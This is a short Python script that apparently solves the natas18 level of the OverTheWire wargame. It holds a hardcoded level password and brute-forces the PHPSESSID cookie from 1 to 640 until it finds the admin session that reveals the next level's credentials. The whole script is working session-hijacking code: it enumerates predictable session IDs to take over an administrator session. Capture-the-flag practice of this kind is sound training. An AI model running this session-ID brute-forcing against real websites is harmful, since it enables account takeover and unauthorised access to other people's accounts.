import requests as req

username = "natas18"
password = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"
url = "http://natas18.natas.labs.overthewire.org"

session = req.Session()
maxID = 640

for e in range(1, maxID+1):
    response = session.post(url, cookies={"PHPSESSID": str(e)}, auth=(username, password))
    responsedContent = response.text

    if ("You are an admin. The credentials for the next level are:" in
            responsedContent):
        print("Found the admin session! PHPSESSID: ", e)
        print(responsedContent)
        break
    else:
        print("Searching for admin session, PHPSESSID: ", e)
